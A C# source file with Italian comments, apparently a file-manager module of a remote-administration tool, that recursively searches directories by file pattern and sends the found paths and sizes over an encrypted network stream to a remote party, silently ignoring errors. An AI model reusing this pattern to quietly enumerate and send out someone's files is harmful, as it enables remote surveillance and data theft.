using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using bc.srv.Class.Comunicator;

namespace bc.srv.Muduli.File_Manager
{
    internal class Search
    {
        private readonly NetworkStream myNetWork;
        private bool stopMe;


        public Search(NetworkStream ctor_Net)
        {
            myNetWork = ctor_Net;
        }


        /// <summary>
        ///     Lista dei Files Recursive in Sdir
        /// </summary>
        /// <param name="sDir"></param>
        /// <param name="sFileType"></param>
        /// <returns></returns>
        public void RecursiveSearch(string sDir, string sFileType)
        {
            if (!stopMe)
            {
                var listaFiles = new List<string>();

                var dirs = Directory.GetDirectories(sDir);

                foreach (var d in dirs)
                    try
                    {
                        var files = Directory.GetFiles(d, sFileType);

                        foreach (var f in files)
                            listaFiles.Add(f);

                        if (listaFiles.Count > 0)
                            SendList(listaFiles);

                        listaFiles.Clear();

                        RecursiveSearch(d, sFileType);
                    }
                    catch
                    {
                    }
            }
        }

        /// <summary>
        ///     Lista dei Files Normal Sdir
        /// </summary>
        /// <param name="sDir"></param>
        /// <param name="sFileType"></param>
        /// <returns></returns>
        public void NormalSearch(string sDir, string sFileType)
        {
            try
            {
                var listaFiles = new List<string>();

                var files = Directory.GetFiles(sDir, sFileType);

                foreach (var f in files)
                    listaFiles.Add(f);

                if (listaFiles.Count > 0)
                    SendList(listaFiles);
            }
            catch
            {
            }
        }


        /// <summary>
        ///     Invio gli item presenti nella lista
        /// </summary>
        private void SendList(List<string> sendingList)
        {
            var message = "";
            var mm = new MsgManager(myNetWork);

            // INVIO RISPOSTA
            foreach (var file in sendingList)
            {
                var fi = new FileInfo(file);
                // string fileName = Path.GetFileName(file);

                var fileInfo = string.Format("{0}|{1}*", file, fi.Length);
                message += fileInfo;
            }

            //-----------------------------------------
            message = message.TrimEnd('*');
            var sent = mm.SendLargeEncryMessage(message, 10000);

            var ok = mm.WaitForEncryMessageRicorsive(15000);

            if (ok != "OK")
                stopMe = true;
        }


        /// <summary>
        ///     Mando Messaggio di fine Files e chiude lo strem!
        /// </summary>
        public void SendStop()
        {
            var message = "__STOP__";
            var mm = new MsgManager(myNetWork);
            var sent = mm.SendLargeEncryMessage(message, 10000);
            myNetWork.Close();
        }
    }
}